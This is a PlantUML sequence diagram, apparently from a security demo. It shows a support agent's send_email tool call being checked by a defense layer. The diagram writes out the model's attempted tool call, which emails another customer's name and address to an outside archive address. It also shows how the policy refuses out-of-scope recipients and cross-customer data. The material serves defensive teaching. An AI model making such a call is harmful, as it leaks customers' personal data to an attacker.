@startuml
title Example 5 - Level 3: the summary is emailed to an outside address
hide footbox
skinparam backgroundColor white
skinparam defaultFontName Arial
skinparam defaultFontSize 12
skinparam shadowing false
skinparam ArrowColor #1F4E79
skinparam participant {
  BackgroundColor #F2F6FA
  BorderColor #1F4E79
}
skinparam actor {
  BackgroundColor #FFF3E0
  BorderColor #1F4E79
}
skinparam sequence {
  LifeLineBorderColor #1F4E79
  GroupBorderColor #1F4E79
  GroupHeaderFontColor #1F4E79
}
skinparam note {
  BackgroundColor #FFFDE7
  BorderColor #9E9D24
}
actor "Support agent\n(presenter)" as P
participant "ShopDeskAgent\nagent.py" as A
participant "Defense\ndefense.py" as D #E8F5E9
participant "LLM" as M
participant "tools/impl.py\nsend_email()" as TL
participant "store.py\nemails (outbox)" as DB
M --> A : tool_use send_email(to="records@shopdesk-archive.example",\nsubject="Ticket summary", body="... Dana Whitfield, 812 Larkspur Ct ...")
alt DEFENSE OFF
  A -> D : check_tool_call(send_email)
  D --> A : allow
  A -> TL : _execute()
  TL -> DB : log_email(to, subject, body)
  TL --> P : trace: "SIMULATED send_email -> records@shopdesk-archive.example"\nside panel: outbox entry
else DEFENSE ON
  A -> D : check_tool_call(send_email)
  D -> D : _policy(): not a ticket sender in this run (scope.senders)\nand AllowList.allows() is false (staff domain shopdesk.example)
  D --> A : refuse
  A --> P : trace: "REFUSED send_email: recipient ... did not send a ticket in this run\nand is not an approved staff address"  rule: reply only to the ticket's own sender
  opt the model emails the T4 sender instead: chris.lindqvist@example.org
    A -> D : check_tool_call(send_email, body with Dana's address)
    D -> D : _other_customers_in(body): 812 Larkspur Ct -> Dana Whitfield
    D --> A : refuse - rule: never send one customer's data to another
    A -> D : check_tool_call(send_email, clean "sorry about the scratch")
    D --> A : approve -> Approve / Deny box shows the full body
  end
end
note over D, TL
  Recipients come from the run's scope, not from "any customer on file".
  The body check is what stops the attacker - who did send a ticket - from receiving Dana's details.
end note
@enduml
